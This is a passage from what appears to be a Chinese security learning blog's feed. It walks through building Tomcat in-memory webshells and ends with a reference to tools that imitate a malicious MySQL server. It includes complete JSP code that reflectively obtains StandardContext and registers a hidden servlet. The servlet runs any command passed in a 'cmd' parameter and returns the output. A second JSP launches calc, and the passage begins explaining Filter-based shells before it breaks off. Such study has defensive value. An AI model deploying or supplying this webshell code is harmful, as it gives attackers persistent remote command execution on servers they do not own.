id="8xx"><a href="#8-x-x" class="headerlink" title="8.x.x"></a>8.x.x</h3><p>8.0以上不再在com.mysql.cj.jdbc.ConnectionImpl中直接执行及获取”SHOW COLLATION”语句，调用链更改，不再调用getObject()方法，此链失效</p><h1 id="mysql恶意服务器"><a href="#mysql恶意服务器" class="headerlink" title="mysql恶意服务器"></a>mysql恶意服务器</h1><p>起恶意的mysql服务还可以用fnmsd师傅的<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server项目</a>（这个我没跑起来）</p><p>还推荐一个java写的带gui的项目：<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学一下常见的JDBC反序列化，是MYSQL的，参考文章：&lt;a href=&quot;https://tttang.com/archive/1877/&quot;&gt;https://tttang.com/archive/1877/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;jdbc简单介绍&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>传统web应用型内存马</title>
    <link href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T14:31:10.000Z</published>
    <updated>2024-09-20T15:19:53.070Z</updated>
    
    <content type="html"><![CDATA[<p>这里是本菜鸡开始学习内存马的起始文章</p><p>有关内存马的认知可以看看su18师傅的这篇文章：<a href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p><p>有关tomcat源码分析的文章：<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat源码初识一 Tomcat整理流程图_tomcat流程图-CSDN博客</a></p><p>然后这里有一篇总结得特别全得内存马文章：<a href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p><p>这里放一张文章中的源码分析的初始化流程图：</p><p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="内存马流程"></p><p>做个参考对大致流程有个概念</p><blockquote><p> 调试的时候我突然发现不应该开启tomcat的自动打开浏览器，这样调试访问前或者访问后的逻辑是才不会那么乱😢</p><p> 因为他默认是在我们访问后才会去创建实例</p></blockquote><h1 id="servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h1><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><p>先写一个简单的demo然后再分析一下原理吧，先看看效果</p><blockquote><p>这里用了使用了tomcat8，tomcat10用那个demo有些类找不到</p><p>要看源码的话需要导入对应tomcat版本的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是tomcat的核心依赖，起服务的过程源码基本都在这里</p></blockquote><p>编写一个servlet内存马的步骤：</p><ul><li>找到StandardContext</li><li>继承并编写一个恶意servlet</li><li>创建Wapper对象</li><li>设置Servlet的LoadOnStartUp的值</li><li>设置Servlet的Name</li><li>设置Servlet对应的Class</li><li>将Servlet添加到context的children中</li><li>将url路径和servlet类做映射</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/&quot;</span> + getRandomString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Servlet&quot;</span> + getRandomString();<br>        <span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                    servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>                    <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                    out.println(output);<br>                    out.flush();<br>                    out.close();<br>                &#125;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            &#125;<br>        &#125;;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>        wrapper.setName(servletName);<br>        wrapper.setServlet(servlet);<br>        wrapper.setServletClass(servlet.getClass().getName());<br>        wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<br>        standardContext.addChild(wrapper);<br>        standardContext.addServletMappingDecoded(servletURL, servletName);<br>        response.getWriter().write(<span class="hljs-string">&quot;[+] Success!!!&lt;br&gt;&lt;br&gt;[*] ServletURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletURL + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] ServletName:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span> + servletName + <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;[*] shellURL:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;http://localhost:8080/test&quot;</span> + servletURL + <span class="hljs-string">&quot;?cmd=echo 世界，你好！&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> e.getMessage();<br>        response.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">outError</span> <span class="hljs-operator">=</span> response.getWriter();<br>        outError.println(<span class="hljs-string">&quot;Error: &quot;</span> + errorMessage);<br>        outError.flush();<br>        outError.close();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;%!<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getRandomString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">characters</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">randomString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.random() * characters.length());<br>            randomString.append(characters.charAt(index));<br>        &#125;<br>        <span class="hljs-keyword">return</span> randomString.toString();<br>    &#125;<br>%&gt;<br><br></code></pre></td></tr></table></figure><p>打入后效果</p><p><img src="https://cdn.clown2024.cn/202409161601686.png" alt="image-20240916160158629"></p><p>然后就可以去访问对应路由执行命令</p><p><img src="https://cdn.clown2024.cn/202409161602929.png" alt="image-20240916160242879"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>servlet内存马就是去找到源码中注册servlet的内容，然后我们重复一遍直接注册自己的servlet即可</p><p>这里我们是去找源码中如何将web.xml的配置变成servlet的过程</p><p>首先找到加载web.xml的ContextConfig#webconfig()</p><p><img src="https://cdn.clown2024.cn/202409161629329.png" alt="image-20240916162907251"></p><p>然后里面就是读取web.xml的一些代码，重要在第九个步骤</p><p><img src="https://cdn.clown2024.cn/202409161630551.png" alt="image-20240916163037486"></p><p>这里注释将web.xml应用于Context，调用ContextConfig#configureContext方法</p><p>跟进去看一看</p><p><img src="https://cdn.clown2024.cn/202409161637697.png" alt="image-20240916163737624"></p><p>这里有很多的操作都是通过context加载进去，这里的context就是我们的StandardContext，tomcat每个容器启动时都会通过一个Standard***#startInternal()方法来启动，所以我们具体的context就是StandardContext开始的，我们可以调试看看这个context</p><p><img src="https://cdn.clown2024.cn/202409161650754.png" alt="image-20240916165022674"></p><p>可以看到是我们的StandardContext，然后这个webxml里面就有解析我们web.xml文件拿到的servlet</p><p><img src="https://cdn.clown2024.cn/202409161651016.png" alt="image-20240916165127949"></p><p>这个Hello就是我们自己注册的，<strong>所以第一步的找到StandardContext，其实就是获取当前应用的context实例</strong>，然后往里面注册servlet，我们回到configureContext方法继续往下找关键地方</p><p><img src="https://cdn.clown2024.cn/202409161658274.png" alt="image-20240916165818197"></p><p>这里遍历我们的servlet然后创建wrapper，我们知道wrapper就是用来封装servlet的</p><p><img src="https://cdn.clown2024.cn/202409161701466.png" alt="image-20240916170126390"></p><p>然后这里的wrapper就是我们知道的tomcat定义的Wrapper的实现类，拿到wrapper之后继续往下，看一下关键的set方法</p><p><img src="https://cdn.clown2024.cn/202409161708368.png" alt="image-20240916170822326"></p><p>第一步先对loadOnStartup的值进行设置，这个值代表的是Servlet在启动时的加载顺序，如果设置为负数，那么Servlet将在第一次请求时才被加载</p><p><img src="https://cdn.clown2024.cn/202409161715978.png" alt="image-20240916171559932"></p><p>这一步就是这是servlet的name</p><p><img src="https://cdn.clown2024.cn/202409161716418.png" alt="image-20240916171636372"></p><p>这一步设置servletClass用的是全类名</p><p><img src="https://cdn.clown2024.cn/202409161719067.png" alt="image-20240916171908029"></p><p>这一步将前面的wrapper添加到context里面</p><p><img src="https://cdn.clown2024.cn/202409161721789.png" alt="image-20240916172036567"></p><p>然后这是将前面的servlet遍历完之后，再遍历servletMapping，往context里面添加映射，下面是servletMappings</p><p><img src="https://cdn.clown2024.cn/202409161722241.png" alt="image-20240916172220190"></p><p>然后这就是整个注册的流程，但是这里并没有实例化我们写的Servlet类，因为它存在懒加载机制，需要我们去访问的时候才会创建实例，但如果我们自己动态在页面写就会走不到那个流程，需要我们直接将实例类放进去</p><p>现在知道所有流程我们就可以开始写内存马了，这里是根据组长的流程来写，比较简单</p><p>第一步找到standardContext，这也是最关键的一步，因为我们知道jsp里面是有request对象的，我们可以通过request对象来获取standardContext</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure><p>我们先看看request#getServletContext返回的对象</p><p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p><p>我们可以看到往里面第二层的context就是StandardContext，这里我们可以直接用反射来获取</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><p>然后后面的就比较简单了，按照我们前面分析的注册步骤即可，就是要注意一点我们要手动将servlet实例注册进去</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.获取wrapper然后添加</span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.添加映射</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure><p>然后这个servlet我们就简单的弹一个计算器，完整的jsp文件如下</p><p>addServlet.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//动态注册</span><br>    <span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.获取wrapper然后添加</span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.添加映射</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p><p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p><p>然后成功白屏弹计算器😋</p><p>而我们前面的demo我是直接用的文章里的，他这里就是用了一个随机路径和随机文件名的方式注册，然后直接用匿名类的形式进行实现化，然后直接将命令结果打印出来到网页</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>他这里使用<code>cmd /c</code>来实现可以执行带有空格的命令，例如<code>echo 世界，你好！</code>；对于Linux系统，那就是<code>/bin/sh -c</code></p><blockquote><p>至于LoadOnStartUp这个玩意没发现他的作用暂时</p></blockquote><p><strong>关于实例化servlet的添加</strong></p><p>因为懒加载机制我们是在访问后才进行的实例化servlet，然后我就想探究一下这个servlet到底是在哪里被实例化然后添加到wrapper里面，但我调了很久也没有发现放进wrapper的地方</p><p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p><p>我这里找到的调用StandardWrapper#allocate()来实例化一个servlet，然后往下有个createFilterChain函数，他将servlet传递了进去，我就去看了一下</p><p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p><p>然后只有这里是将实例添加进了filterchain，此时我还是没看到如exp里面的要将servlet放进wrapper里面</p><p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p><p>最后执行到servlet的时候就是在doFilter方法里面调用servlet属性的service方法，然后到servlet的doGet方法里了</p><p>后来终于想通了，看代码太不细致还是漏了关键的地方，我在访问内存马页面之后再调试回到那个allocate方法里面，发现我们设置了实例之后他的判断逻辑就不同了</p><p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p><p>因为我们设置了instance，这部分的逻辑就被跳过了，然后就会到下面这里</p><p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p><p>直接返回我们设置的instance，然后再放进了filterchain里面，这就是为什么我们需要用wrapper.setServlet方法的原因</p><p>所以其实我在想如果能够获取filterChain的话直接添加效果应该也是一样的</p><h1 id="filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><p>这部分参考文章：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/，https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>写Filter内存马的步骤：</p><ul><li>获取StandardContext；</li><li>继承并编写一个恶意filter；</li><li>实例化一个FilterDef类，包装filter并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中；</li><li>通过反射获取filterConfigs，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到filterConfig中。</li></ul><p>有关filter相关的内容可以看一下里面文章的总结。</p><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里开始先分析再写</p><p>filter我们知道就是servlet前的一个过滤器，所以我们只要实现一个filter并写恶意代码，然后添加进去即可</p><p><strong>了解一下有关filter的各个名词</strong></p><ul><li>FilterDefs：首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等。</li><li>FilterConfigs：是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求。</li><li>FilterMaps：用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs。</li><li>FilterChain：是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。</li></ul><p><strong>访问网页前的filter添加</strong></p><p>同样的filter的添加也在我们之前说到的ContextConfig#configureContext里面</p><p><img src="https://cdn.clown2024.cn/202409161922576.png" 